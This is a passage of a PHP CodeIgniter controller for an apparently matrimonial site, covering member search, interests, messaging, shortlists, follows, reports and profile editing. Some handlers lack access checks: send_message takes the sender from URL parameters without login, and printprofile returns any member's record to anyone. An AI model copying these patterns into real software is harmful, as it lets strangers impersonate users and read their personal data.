                foreach ($by_sub_castes as $by_sub_castes) {
                    $by_sub_caste[] = $by_sub_castes->member_id;
                }
            } else {
                $by_sub_caste = $all_result;
            }

            if (isset($language) && $language != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('mother_tounge', $language, 'both');
                $by_languages = $this->db->get('member')->result();
                foreach ($by_languages as $by_languages) {
                    $by_language[] = $by_languages->member_id;
                }
            } else {
                $by_language = $all_result;
            }

            if (isset($country) && $country != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('present_address','"country":"'.$country.'"','both');
                $by_countries = $this->db->get('member')->result();
                foreach ($by_countries as $by_countries) {
                    $by_country[] = $by_countries->member_id;
                }
            } else {
                $by_country = $all_result;
            }

            if (isset($state) && $state != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('present_address','"state":"'.$state.'"','both');
                $by_states = $this->db->get('member')->result();
                foreach ($by_states as $by_states) {
                    $by_state[] = $by_states->member_id;
                }
            } else {
                $by_state = $all_result;
            }

            if (isset($city) && $city != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('present_address','"city":"'.$city.'"','both');
                $by_cities = $this->db->get('member')->result();
                foreach ($by_cities as $by_cities) {
                    $by_city[] = $by_cities->member_id;
                }
            } else {
                $by_city = $all_result;
            }

            if (isset($sql_aged_from) && isset($sql_aged_to)) {
                $this->db->order_by('member_id','desc');
                $by_ages = $this->db->select('member_id')->get_where('member',array('date_of_birth <=' => $sql_aged_from, 'date_of_birth >=' => $sql_aged_to))->result();
                foreach ($by_ages as $by_ages) {
                    $by_age[] = $by_ages->member_id;
                }
            } else {
                $by_age = $all_result;
            }

            if (isset($min_height) && isset($max_height)) {
                $this->db->order_by('member_id','desc');
                $by_heights = $this->db->select('member_id')->get_where('member',array('height >=' => $min_height, 'height <=' => $max_height))->result();
                foreach ($by_heights as $by_heights) {
                    $by_height[] = $by_heights->member_id;
                }
            } else {
                $by_height = $all_result;
            }
            if (isset($search_member_type)) {
                if ($search_member_type == "free_members") {
                    $array_data = array('membership' => 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $by_members_type = $this->db->select('member_id')->get_where('member', $array_data)->result();
                }
                elseif ($search_member_type == "premium_members") {
                    $array_data = array('membership' => 2);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $by_members_type = $this->db->select('member_id')->get_where('member', $array_data)->result();
                }
                elseif ($search_member_type == "all") {
                    $by_members_type = $all_id;
                }
                foreach ($by_members_type as $by_members_type) {
                    $by_member_type[] = $by_members_type->member_id;
                }
            } else {
                $by_height = $all_result;
            }
            /*print_r($by_gender);
            echo "<br>";
            print_r($by_marital_status);
            echo "<br>";
            print_r($by_religion);
            echo "<br>";
            print_r($by_language);
            echo "<br>";
            print_r($by_country);
            echo "<br>";
            print_r($by_state);
            echo "<br>";
            print_r($by_city);
            echo "<br>all<br>";*/
            $all_array = array_intersect($by_gender,$by_member_profile_id,$by_profession,$by_marital_status,$by_religion,$by_caste,$by_sub_caste,$by_language,$by_country,$by_state,$by_city,$by_age,$by_height);

            if (count($all_array) != 0) {
                $cond = array('is_blocked' =>'no','is_closed' =>'no', 'email_verification_status'=> 1);
                $cond = status($member_approval, $cond);
                $this->db->order_by('member_id','desc');
                $this->db->where_in('member_id', $all_array);
                $page_data['get_all_members'] = $this->db->where($cond)->get('member', $config['per_page'], $para1)->result();
            } else {
                $page_data['get_all_members']  = array();
            }
        }
        elseif ($para2 == "") {
            if ($this->member_permission() == FALSE) {
                $cond = array('is_blocked' =>'no','is_closed' =>'no', 'email_verification_status'=> 1);
                $cond = status($member_approval, $cond);
                $this->db->order_by('member_id','desc');
                $page_data['get_all_members'] = $this->db->where($cond)->get('member', $config['per_page'], $para1)->result();
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $page_data['get_all_members'] = $this->db->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data, $config['per_page'], $para1)->result();
                }
                else {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $page_data['get_all_members'] = $this->db->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data , $config['per_page'], $para1)->result();
                }
            }
        }

        $page_data['count'] = $config['total_rows'];
        $this->load->view('front/listing/members', $page_data);
    }

    function top_bar_right() {
        recache();
        $this->load->view('front/header/top_bar_right');
    }

    function add_interest($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $express_interest = $this->Crud_model->get_type_name_by_id('member', $member, 'express_interest');
        if ($express_interest > 0) {
            $interests = $this->Crud_model->get_type_name_by_id('member', $member, 'interest');
            $interest = json_decode($interests, true);
            if (empty($interest)) {
                $interest = array();
                $interest[] = array('id'=>$member_id,'status'=>'pending','time'=>time());
            }
            if (!in_assoc_array($member_id, 'id', $interest)) {
                $interest[] = array('id'=>$member_id,'status'=>'pending','time'=>time());
            }
            $this->db->where('member_id', $member);
            $this->db->update('member', array('interest' => json_encode($interest)));

            // Subtracting a Remaining Interest
            $express_interest = $express_interest - 1;
            $this->db->where('member_id', $member);
            $this->db->update('member', array('express_interest' => $express_interest));
            recache();

            // Updating the interest into the chosen Member
            $member_interests = $this->Crud_model->get_type_name_by_id('member', $member_id, 'interested_by');
            $member_interest = json_decode($member_interests, true);

            $notifications = $this->Crud_model->get_type_name_by_id('member', $member_id, 'notifications');
            $notification = json_decode($notifications, true);

            if (empty($member_interest)) {
                $member_interest = array();
                $member_interest[] = array('id'=>$member, 'status'=>'pending', 'time'=>time());
                $notification[] = array('by'=>$member, 'type'=>'interest_expressed', 'status'=>'pending', 'is_seen'=>'no', 'time'=>time());
            }
            if (!in_assoc_array($member, 'id',$member_interest)) {
                $member_interest[] = array('id'=>$member, 'status'=>'pending', 'time'=>time());
                $notification[] = array('by'=>$member, 'type'=>'interest_expressed', 'status'=>'pending', 'is_seen'=>'no', 'time'=>time());
            }

            $this->db->where('member_id', $member_id);
            $this->db->update('member', array('interested_by' => json_encode($member_interest), 'notifications' => json_encode($notification)));

            if($this->db->get_where('general_settings', array('type' => 'email_notification_on_express_interest'))->row()->value == "on"){
                $this->Email_model->express_interest($member, $member_id);
            }

            recache();
        }
    }

    function accept_interest($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }

        $member = $this->session->userdata('member_id');
        // For Updating User's interested_by
        $interested_by = $this->Crud_model->get_type_name_by_id('member', $member, 'interested_by');
        $interested_by = json_decode($interested_by, true);
        $new_interested_by = array();
        if (!empty($interested_by)) {
            foreach ($interested_by as $value1) {
                // print_r($value1)."<br>";
                if ($value1['id'] != $member_id) {
                    array_push($new_interested_by, $value1);
                }
                elseif ($value1['id'] == $member_id) {
                    array_push($new_interested_by, array('id'=>$value1['id'], 'status'=>'accepted', 'time'=>time()));
                }
                // print_r($new_interested_by)."<br>";
            }
        }
        // For Updating User's notifications
        $user_notifications = $this->Crud_model->get_type_name_by_id('member', $member, 'notifications');
        $user_notifications = json_decode($user_notifications, true);
        $new_user_notification = array();
        if (empty($user_notifications)) {
            // print_r($user_notifications)."<br>";
            array_push($new_user_notification, array('by'=>$member_id, 'type'=>'accepted_interest', 'status'=>'accepted', 'is_seen'=>'no', 'time'=>time()));
            // print_r($new_user_notification);
        }
        if (!empty($user_notifications)) {
            foreach ($user_notifications as $value2) {
                // print_r($value2)."<br>";
                if ($value2['by'] != $member_id) {
                    array_push($new_user_notification, $value2);
                }
                elseif ($value2['by'] == $member_id) {
                    array_push($new_user_notification, array('by'=>$value2['by'], 'type'=>'interest_expressed', 'status'=>'accepted', 'is_seen'=>'no', 'time'=>time()));
                }
                // print_r($new_user_notification);
            }
        }
        $this->db->where('member_id', $member);
        $this->db->update('member', array('interested_by' => json_encode($new_interested_by), 'notifications' => json_encode($new_user_notification)));

        // For Updating Member's interest
        $interest = $this->Crud_model->get_type_name_by_id('member', $member_id, 'interest');
        $interest = json_decode($interest, true);
        $new_interest = array();
        if (!empty($interest)) {
            foreach ($interest as $value3) {
                // print_r($value3)."<br>";
                if ($value3['id'] != $member) {
                    array_push($new_interest, $value3);
                }
                elseif ($value3['id'] == $member) {
                    array_push($new_interest, array('id'=>$value3['id'], 'status'=>'accepted', 'is_seen'=>'no', 'time'=>time()));
                }
                // print_r($new_interest)."<br>";
            }
        }
        // For Updating Member's notifications
        $member_notifications = $this->Crud_model->get_type_name_by_id('member', $member_id, 'notifications');
        $member_notifications = json_decode($member_notifications, true);
        // print_r($member_notifications)."<br>";
        array_push($member_notifications, array('by'=>$member, 'type'=>'accepted_interest', 'status'=>'accepted', 'is_seen'=>'no', 'time'=>time()));
        // print_r($member_notifications);

        $this->db->where('member_id', $member_id);
        $this->db->update('member', array('interest' => json_encode($new_interest), 'notifications' => json_encode($member_notifications)));
        recache();
    }

    function reject_interest($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }

        $member = $this->session->userdata('member_id');
        // For Updating User's interested_by
        $interested_by = $this->Crud_model->get_type_name_by_id('member', $member, 'interested_by');
        $interested_by = json_decode($interested_by, true);
        $new_interested_by = array();
        if (!empty($interested_by)) {
            foreach ($interested_by as $value1) {
                // print_r($value1)."<br>";
                if ($value1['id'] != $member_id) {
                    array_push($new_interested_by, $value1);
                }
                /*elseif ($value1['id'] == $member_id) {
                    array_push($new_interested_by, array('id'=>$value1['id'], 'status'=>'rejected', 'time'=>time()));
                }*/
                // print_r($new_interested_by)."<br>";
            }
        }
        // For Updating User's notifications
        $user_notifications = $this->Crud_model->get_type_name_by_id('member', $member, 'notifications');
        $user_notifications = json_decode($user_notifications, true);
        $new_user_notification = array();
        if (empty($user_notifications)) {
            // print_r($user_notifications)."<br>";
            array_push($new_user_notification, array('by'=>$member_id, 'type'=>'rejected_interest', 'status'=>'rejected', 'is_seen'=>'no', 'time'=>time()));
            // print_r($new_user_notification);
        }
        if (!empty($user_notifications)) {
            foreach ($user_notifications as $value2) {
                // print_r($value2)."<br>";
                if ($value2['by'] != $member_id) {
                    array_push($new_user_notification, $value2);
                }
                elseif ($value2['by'] == $member_id) {
                    array_push($new_user_notification, array('by'=>$value2['by'], 'type'=>'interest_expressed', 'status'=>'rejected', 'is_seen'=>'no', 'time'=>time()));
                }
                // print_r($new_user_notification);
            }
        }
        $this->db->where('member_id', $member);
        $this->db->update('member', array('interested_by' => json_encode($new_interested_by), 'notifications' => json_encode($new_user_notification)));

        // For Updating Member's interest
        $interest = $this->Crud_model->get_type_name_by_id('member', $member_id, 'interest');
        $interest = json_decode($interest, true);
        $new_interest = array();
        if (!empty($interest)) {
            foreach ($interest as $value3) {
                // print_r($value3)."<br>";
                if ($value3['id'] != $member) {
                    array_push($new_interest, $value3);
                }
                /*elseif ($value3['id'] == $member) {
                    array_push($new_interest, array('id'=>$value3['id'], 'status'=>'rejected', 'time'=>time()));
                }*/
                // print_r($new_interest)."<br>";
            }
        }
        // For Updating Member's notifications
        $member_notifications = $this->Crud_model->get_type_name_by_id('member', $member_id, 'notifications');
        $member_notifications = json_decode($member_notifications, true);
        // print_r($member_notifications)."<br>";
        array_push($member_notifications, array('by'=>$member, 'type'=>'rejected_interest', 'status'=>'rejected', 'is_seen'=>'no', 'time'=>time()));
        // print_r($member_notifications);

        $this->db->where('member_id', $member_id);
        $this->db->update('member', array('interest' => json_encode($new_interest), 'notifications' => json_encode($member_notifications)));
        recache();
    }

    function enable_message($member_id)
    {
       if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $direct_messages = $this->Crud_model->get_type_name_by_id('member', $member, 'direct_messages');
        if ($direct_messages > 0) {
            $data['message_thread_from'] = $member;
            $data['message_thread_to'] = $member_id;
            $data['message_thread_time'] = time();
            $this->db->insert('message_thread', $data);

            // Subtracting a Direct Message
            $direct_messages = $direct_messages - 1;
            $this->db->where('member_id', $member);
            $this->db->update('member', array('direct_messages' => $direct_messages));
            recache();
        }
    }

    function get_messages($message_thread_id, $get_all='')
    {
       if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        if ($get_all == "") {
            $member = $this->session->userdata('member_id');
            $member_position = $this->Crud_model->message_thread_member_position($message_thread_id,$member);
            $this->db->where('message_thread_id', $message_thread_id);
            $this->db->update('message_thread', array('message_'.$member_position.'_seen' => 'yes'));
            recache();

            $page_data['message_thread_id'] = $message_thread_id;
            $messages_query = $this->db->order_by('message_time')->get_where('message', array('message_thread_id' => $message_thread_id));
            $page_data['message_count'] = $messages_query->num_rows();
            if ($page_data['message_count'] <= 50) {
                $page_data['messages'] = $messages_query->result();
            } else {
                $limit_from = $page_data['message_count'] - 50;
                $limit_amount = 50;
                $page_data['messages'] = $this->db->order_by('message_time')->limit($limit_amount, $limit_from)->get_where('message', array('message_thread_id' => $message_thread_id))->result();
            }
        }
        elseif ($get_all == "all_msg") {
            $member = $this->session->userdata('member_id');
            $member_position = $this->Crud_model->message_thread_member_position($message_thread_id,$member);
            $this->db->where('message_thread_id', $message_thread_id);
            $this->db->update('message_thread', array('message_'.$member_position.'_seen' => 'yes'));
            recache();

            $page_data['message_thread_id'] = $message_thread_id;
            $messages_query = $this->db->order_by('message_time')->get_where('message', array('message_thread_id' => $message_thread_id));
            $page_data['messages'] = $messages_query->result();
            $page_data['message_count'] = 0; // to set the frontend variable for not displaying SHOW ALL MSG
        }

        $this->load->view('front/profile/messaging/messages', $page_data);
    }

    function send_message ($message_thread_id, $message_from, $message_to) {
        $data['message_thread_id'] = $message_thread_id;
        $data['message_from'] = $message_from;
        $data['message_to'] = $message_to;
        $data['message_text'] = $this->input->post('message_text');
        $data['message_time'] = time();
        $this->db->insert('message', $data);

        if($this->db->get_where('general_settings', array('type' => 'email_notification_on_sending_message'))->row()->value == "on"){
            $this->Email_model->send_message($message_from, $message_to);
        }

        $member_position = $this->Crud_model->message_thread_member_position($message_thread_id,$message_to);
        $this->db->where('message_thread_id', $message_thread_id);
        $this->db->update('message_thread', array('message_'.$member_position.'_seen' => '','message_thread_time' => time()));
        recache();
    }

    function add_shortlist($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $shortlists = $this->Crud_model->get_type_name_by_id('member', $member, 'short_list');
        $shortlisted = json_decode($shortlists, true);
        if (empty($shortlisted)) {
            $shortlisted = array();
            array_push($shortlisted, $member_id);
        }
        if (!in_array($member_id, $shortlisted)) {
            array_push($shortlisted, $member_id);
        }
        $this->db->where('member_id', $member);
        $this->db->update('member', array('short_list' => json_encode($shortlisted)));
        recache();
    }

    function remove_shortlist($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $shortlists = $this->Crud_model->get_type_name_by_id('member', $member, 'short_list');
        $shortlisted = json_decode($shortlists, true);
        // $key = array_search($member_id, $shortlisted);
        if (empty($shortlisted)) {
            $shortlisted = array();
        }
        // unset($shortlisted[$key]);
        $new_array = array();
        foreach ($shortlisted as $value) {
            if ($value != $member_id) {
                array_push($new_array, $value);
            }
        }
        $shortlisted = $new_array;
        $this->db->where('member_id', $member);
        $this->db->update('member', array('short_list' => json_encode($shortlisted)));
        recache();
    }

    function add_follow($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        // session member = $member
        // to whome follow = $member_id
        $member = $this->session->userdata('member_id');
        $follows = $this->Crud_model->get_type_name_by_id('member', $member, 'followed');
        $followed = json_decode($follows, true);
        if (empty($followed)) {
            $followed = array();
            array_push($followed, $member_id);

            $follower = $this->Crud_model->get_type_name_by_id('member', $member_id, 'follower');
            $follower = $follower + 1;
            $this->db->where('member_id', $member_id);
            $this->db->update('member', array('follower' => $follower));
        }
        if (!in_array($member_id, $followed)) {
            array_push($followed, $member_id);

            $follower = $this->Crud_model->get_type_name_by_id('member', $member_id, 'follower');
            $follower = $follower + 1;
            $this->db->where('member_id', $member_id);
            $this->db->update('member', array('follower' => $follower));
        }
        $this->db->where('member_id', $member);
        $this->db->update('member', array('followed' => json_encode($followed)));
        recache();
    }

    function add_unfollow($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $follows = $this->Crud_model->get_type_name_by_id('member', $member, 'followed');
        $followed = json_decode($follows, true);
        // $key = array_search($member_id, $followed);
        if (empty($followed)) {
            $followed = array();
        }
        // unset($followed[$key]);
        $new_array = array();
        foreach ($followed as $value) {
            if ($value != $member_id) {
                array_push($new_array, $value);
            }
        }
        $followed = $new_array;
        $this->db->where('member_id', $member);
        $this->db->update('member', array('followed' => json_encode($followed)));

        $follower = $this->Crud_model->get_type_name_by_id('member', $member_id, 'follower');
        $follower = $follower - 1;
        $this->db->where('member_id', $member_id);
        $this->db->update('member', array('follower' => $follower));
        recache();
    }

    function add_ignore($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $ignores = $this->Crud_model->get_type_name_by_id('member', $member, 'ignored');
        $ignored_bys = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
        $ignored = json_decode($ignores, true);
        $ignored_by = json_decode($ignored_bys, true);
        // FOR Logged in USER
        if (empty($ignored)) {
            $ignored = array();
            array_push($ignored, $member_id);
        }
        elseif (!empty($ignored)) {
            if (!in_array($member_id, $ignored)) {
                array_push($ignored, $member_id);
            }
        }
        $this->db->where('member_id', $member);
        $this->db->update('member', array('ignored' => json_encode($ignored)));

        // FOR IGNORED USER
        if (empty($ignored_by)) {
            $ignored_by = array();
            array_push($ignored_by, $member);
        }
        elseif (!empty($ignored_by)) {
            if (!in_array($member, $ignored_by)) {
                array_push($ignored_by, $member);
            }
        }
        $this->db->where('member_id', $member_id);
        $this->db->update('member', array('ignored_by' => json_encode($ignored_by)));
        recache();
    }

    function do_unblock($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $ignores = $this->Crud_model->get_type_name_by_id('member', $member, 'ignored');
        $ignored = json_decode($ignores, true);
        if (empty($ignored)) {
            $ignored = array();
        }
        $new_array = array();
        foreach ($ignored as $value) {
            if ($value != $member_id) {
                array_push($new_array, $value);
            }
        }
        $ignored = $new_array;
        $this->db->where('member_id', $member);
        $this->db->update('member', array('ignored' => json_encode($ignored)));
        recache();
    }

    function add_report($member_id)
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        $member = $this->session->userdata('member_id');
        $reports = $this->Crud_model->get_type_name_by_id('member', $member, 'report_profile');
        $reported = json_decode($reports, true);
        if (empty($reported))
        {
            $reported = array();
            array_push($reported, $member_id);
        }
        if (!in_array($member_id, $reported))
        {
            array_push($reported, $member_id);
        }
        $this->db->where('member_id', $member);
        $this->db->update('member', array('report_profile' => json_encode($reported)));

        $reported_persion =  $this->db->get_where('member',array('member_id' => $member_id))->row()->reported_by;
        $report_count = $reported_persion + 1;
        $this->db->where('member_id', $member_id);
        $this->db->update('member', array('reported_by' => $report_count));

        // Email send
        $from =  $this->db->get_where('member',array('member_id' => $member))->row()->email;
        $from_name =  $this->db->get_where('member',array('member_id' => $member))->row()->first_name.' '.$this->db->get_where('member',array('member_id' => $member))->row()->last_name;
        $reported_person = $member_id;

        $this->Email_model->profile_report($from,$from_name,$reported_person);


        recache();
    }
    function printprofile($para1="",$para2="",$para3="")
    {
        if ($para1 == "")
        {
            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $this->load->view('front/profile/print_user/index',$page_data);
        }
        else
        {
            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $para1))->result();
            $this->load->view('front/profile/print_user/index',$page_data);
        }
        //var_dump('Testing');
        //die;
    }
    function profile($para1="",$para2="",$para3="")
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }
        if ($para1 == "" || $para1 == "nav") {
            $page_data['title'] = "Profile || ".$this->system_title;
            $page_data['top'] = "profile.php";
            $page_data['page'] = "profile/dashboard";
            $page_data['bottom'] = "profile.php";
            $member = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
            $pkInfo = json_decode($member[0]->package_info,true);
            $rmCount = $pkInfo[0]['view_count'] - count($this->db->get_where("member_profile_view",array("member_id" => $this->session->userdata('member_id')))->result());
            $member[0]->rm_count = $rmCount;
            $page_data['get_member'] = $member;
            if ($this->session->flashdata('alert') == "edit") {
                $page_data['success_alert'] = translate("you_have_successfully_edited_your_profile!");
            }
            elseif ($this->session->flashdata('alert') == "edit_image") {
                $page_data['success_alert'] = translate("you_have_successfully_edited_your_profile_image!");
            }
            elseif ($this->session->flashdata('alert') == "add_gallery") {
                $page_data['success_alert'] = translate("you_have_successfully_added_the_photo_into_your_gallery!");
            }
            elseif ($this->session->flashdata('alert') == "failed") {
                $page_data['danger_alert'] = translate("failed_to_upload_your_image._make_sure_the_image_is_JPG,_JPEG_or_PNG!");
            }
            elseif ($this->session->flashdata('alert') == "add_story") {
                $page_data['success_alert'] = translate("you_have_successfully_added_your_story._please_wait_till_it_is_approved!");
            }
            elseif ($this->session->flashdata('alert') == "failed_add_story") {
                $page_data['danger_alert'] = translate("failed_to_add_your_story!");
            }
            elseif ($this->session->flashdata('alert') == "demo_msg") {
                $page_data['danger_alert'] = translate("this_operation_is_disabled_in_demo!");
            }
            $page_data['load_nav']  = $para2;
            $page_data['sp_nav']    = $para3;

            $this->load->view('front/index', $page_data);
        }
        elseif ($para1=="followed_users") {
            $this->load->view('front/profile/followed_users/index');
        }
        elseif ($para1=="messaging") {
            $user_id = $this->session->userdata('member_id');
            $page_data['listed_messaging_members'] = $this->Crud_model->get_listed_messaging_members($user_id);

            $this->load->view('front/profile/messaging/index', $page_data);
        }
        elseif ($para1=="short_list") {
            $this->load->view('front/profile/short_list/index');
        }
        elseif ($para1=="my_interests") {
            $this->load->view('front/profile/my_interests/index');
        }
        elseif ($para1=="ignored_list") {
            $this->load->view('front/profile/ignored_list/index');
        }
        elseif ($para1=="my_packages") {
            $this->load->view('front/profile/my_packages/index');
        }
        elseif ($para1=="payments") {
            $page_data['payments_info'] = $this->db->order_by("purchase_datetime", "desc")->get_where('package_payment', array('member_id' => $this->session->userdata('member_id')))->result();
            $this->load->view('front/profile/payments/index', $page_data);
        }
        elseif ($para1=="change_pass") {
            $this->load->view('front/profile/change_password/index');
        }
         elseif ($para1=="picture_privacy") {
            $this->load->view('front/profile/picture_privacy/index');
        }
        elseif ($para1=="close_account") {
            if($para2=="yes"){
                $data['is_closed']=$para2;
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
            }elseif($para2=="no"){
                $data['is_closed']=$para2;
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
            }else{
                 $this->load->view('front/profile/close_account/index');
            }

        }
        elseif ($para1=="reopen_account") {
            if($para2=="yes"){
                $data['is_closed']= 'no';
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
            }elseif($para2=="no"){
                $data['is_closed']='yes';
                $this->db->where('member_id', $this->session->userdata('member_id'));
                $result = $this->db->update('member', $data);
            }else{
                 $this->load->view('front/profile/reopen_account/index');
            }

        }
        elseif ($para1=="gallery") {
            $this->load->view('front/profile/gallery/index');
        }
        elseif ($para1=="gallery_upload") {
            $this->load->view('front/profile/gallery_upload/index');
        }
        elseif ($para1=="happy_story") {
            $this->load->view('front/profile/happy_story/index');
        }
        elseif ($para1=="edit_full_profile") {
            $page_data['title'] = "Edit Profile || ".$this->system_title;
            $page_data['top'] = "profile.php";
            $page_data['page'] = "profile/edit_full_profile";
            $page_data['bottom'] = "profile.php";
            $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();

            $page_data['load_nav']  = $para2;
            $page_data['sp_nav']    = $para3;

            $this->load->view('front/index', $page_data);
        }
        elseif ($para1=="update_all") {
            $this->form_validation->set_rules('introduction', 'Introduction', 'required');

            $this->form_validation->set_rules('first_name', 'First Name', 'required');
            $this->form_validation->set_rules('last_name', 'Last Name', 'required');
            $this->form_validation->set_rules('gender', 'Gender', 'required');
            $this->form_validation->set_rules('on_behalf', 'On Behalf', 'required');
            if ($this->input->post('old_email') != $this->input->post('email')) {
                $this->form_validation->set_rules('email', 'Email', 'required|is_unique[member.email]',array('required' => 'The %s is required.', 'is_unique' => 'This %s already exists.'));
            }
            if ($this->input->post('old_mobile') != $this->input->post('mobile')) {
                $this->form_validation->set_rules('mobile', 'Mobile', 'required|is_unique[member.mobile]',array('required' => 'The %s is required.', 'is_unique' => 'This %s already exists.'));
            }
            $this->form_validation->set_rules('marital_status', 'Marital Status', 'required');
            $this->form_validation->set_rules('date_of_birth', 'Date of Birth', 'required');

            if ($this->db->get_where('frontend_settings', array('type' => 'present_address'))->row()->value == "yes")
            {
                $this->form_validation->set_rules('country', 'Country', 'required');
                $this->form_validation->set_rules('state', 'State', 'required');
            }

            if ($this->db->get_where('frontend_settings', array('type' => 'education_and_career'))->row()->value == "yes")
            {
                $this->form_validation->set_rules('highest_education', 'Highest Education', 'required');
                $this->form_validation->set_rules('occupation', 'Occupation', 'required');
            }

            if ($this->db->get_where('frontend_settings', array('type' => 'language'))->row()->value == "yes")
            {
                $this->form_validation->set_rules('mother_tongue', 'Mother Tongue', 'required');
            }

            if ($this->db->get_where('frontend_settings', array('type' => 'residency_information'))->row()->value == "yes")
            {
                $this->form_validation->set_rules('birth_country', 'Birth Country', 'required');
                $this->form_validation->set_rules('citizenship_country', 'Citizenship Country', 'required');
            }

            if ($this->db->get_where('frontend_settings', array('type' => 'spiritual_and_social_background'))->row()->value == "yes")
            {
                $this->form_validation->set_rules('religion', 'Religion', 'required');
            }

            if ($this->db->get_where('frontend_settings', array('type' => 'permanent_address'))->row()->value == "yes")
            {
                $this->form_validation->set_rules('permanent_country', 'Permanent Country', 'required');
                $this->form_validation->set_rules('permanent_state', 'Permanent State', 'required');
            }

            if ($this->form_validation->run() == FALSE) {
                $page_data['form_contents'] = $this->input->post();
                $page_data['title'] = "Edit Profile || ".$this->system_title;
                $page_data['top'] = "profile.php";
                $page_data['page'] = "profile/edit_full_profile";
                $page_data['bottom'] = "profile.php";
                $page_data['load_nav']  = $para2;
                $page_data['sp_nav']    = $para3;
                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $this->load->view('front/index', $page_data);
            }
            else {
                $data['first_name'] = $this->input->post('first_name');
                $data['last_name'] = $this->input->post('last_name');
                $data['gender'] = $this->input->post('gender');
                if(!demo()){
                    $data['email'] = $this->input->post('email');
                }
                $data['mobile'] = $this->input->post('mobile');
                $data['secondary_mobile'] = $this->input->post('secondary_mobile');
                $data['date_of_birth'] = strtotime($this->input->post('date_of_birth'));
                $data['height'] = $this->input->post('height');
                $data['introduction'] = $this->input->post('introduction');

                // ------------------------------------Basic Info------------------------------------ //
                $basic_info[] = array(
                                    'marital_status'        =>  $this->input->post('marital_status'),
                                    'number_of_children'    =>  $this->input->post('number_of_children'),
                                    'area'                  =>  $this->input->post('area'),
                                    'on_behalf'             =>  $this->input->post('on_behalf')
                                    );
                $data['basic_info'] = json_encode($basic_info);
                // ------------------------------------Basic Info------------------------------------ //

                // ------------------------------------Present Address------------------------------------ //
                $present_address[] = array('country'        =>  $this->input->post('country'),
                                    'city'                  =>  $this->input->post('city'),
                                    'state'                 =>  $this->input->post('state'),
                                    'postal_code'           =>  $this->input->post('postal_code')
                                    );
                $data['present_address'] = json_encode($present_address);
                // ------------------------------------Present Address------------------------------------ //

                // ------------------------------------Education & Career------------------------------------ //
                $education_and_career[] = array('highest_education' =>  $this->input->post('highest_education'),
                                    'occupation'                    =>  $this->input->post('occupation'),
                                    'annual_income'                 =>  $this->input->post('annual_income')
                                    );
                $data['education_and_career'] = json_encode($education_and_career);
                // ------------------------------------Education & Career------------------------------------ //

                // ------------------------------------ Physical Attributes------------------------------------ //
                $physical_attributes[] = array('weight'     =>  $this->input->post('weight'),
                                    'eye_color'             =>  $this->input->post('eye_color'),
                                    'hair_color'            =>  $this->input->post('hair_color'),
                                    'complexion'            =>  $this->input->post('complexion'),
                                    'blood_group'           =>  $this->input->post('blood_group'),
                                    'body_type'             =>  $this->input->post('body_type'),
                                    'body_art'              =>  $this->input->post('body_art'),
                                    'any_disability'        =>  $this->input->post('any_disability')
                                    );
